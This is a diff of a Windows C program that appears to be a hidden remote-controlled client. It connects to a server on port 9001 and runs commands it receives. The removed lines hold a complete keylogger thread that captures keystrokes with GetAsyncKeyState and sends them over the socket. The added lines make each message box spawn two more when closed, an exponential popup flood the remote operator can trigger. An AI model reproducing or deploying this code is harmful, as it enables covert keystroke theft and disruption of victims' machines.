@@ -7,40 +7,15 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
-volatile int keep_keylogging = 1;
-
-// Background keylogger thread
-unsigned __stdcall keylogger_thread(void* arg) {
-    SOCKET s = (SOCKET)(uintptr_t)arg;
-    char log[1024] = {0};
-    int idx = 0;
-    while (keep_keylogging) {
-        for (int vk = 8; vk <= 222; vk++) {
-            SHORT state = GetAsyncKeyState(vk);
-            if (state & 0x0001) { // Just pressed
-                if ((vk >= 'A' && vk <= 'Z') || (vk >= '0' && vk <= '9')) {
-                    log[idx++] = (char)vk;
-                } else if (vk == VK_SPACE) {
-                    log[idx++] = ' ';
-                } else if (vk == VK_RETURN) {
-                    log[idx++] = '\n';
-                }
-                if (idx >= sizeof(log) - 2 || vk == VK_RETURN) {
-                    log[idx] = 0;
-                    send(s, log, strlen(log), 0);
-                    idx = 0;
-                }
-            }
-        }
-        Sleep(10);
-    }
-    return 0;
-}
-
 // Thread function for message box
 unsigned __stdcall show_messagebox(void* arg) {
     char* msg = (char*)arg;
     MessageBoxA(NULL, msg, "Server Message", MB_OK | MB_ICONINFORMATION);
+    // After closing, spawn two new message boxes with the same message
+    char* msg1 = _strdup(msg);
+    char* msg2 = _strdup(msg);
+    _beginthreadex(NULL, 0, show_messagebox, msg1, 0, NULL);
+    _beginthreadex(NULL, 0, show_messagebox, msg2, 0, NULL);
     free(msg);
     return 0;
 }
@@ -59,11 +34,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     server.sin_port = htons(9001);
 
     if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
+        // No console output
         return 1;
     }
-
-    // Start keylogger thread
-    HANDLE hKeylog = (HANDLE)_beginthreadex(NULL, 0, keylogger_thread, (void*)(uintptr_t)s, 0, NULL);
 
     while (1) {
         int len = recv(s, buf, sizeof(buf)-1, 0);
@@ -73,6 +46,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         sscanf(buf, "%15s %999[^\n]", cmd, arg);
 
         if (_stricmp(cmd, "PRINT") == 0) {
+            // Spawn a thread for each message box
             char* msg = _strdup(arg);
             _beginthreadex(NULL, 0, show_messagebox, msg, 0, NULL);
             send(s, "Printed OK", 10, 0);
@@ -88,9 +62,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    // Stop keylogger thread
-    keep_keylogging = 0;
-    Sleep(100); // Give thread time to exit
     closesocket(s);
     WSACleanup();
     return 0;
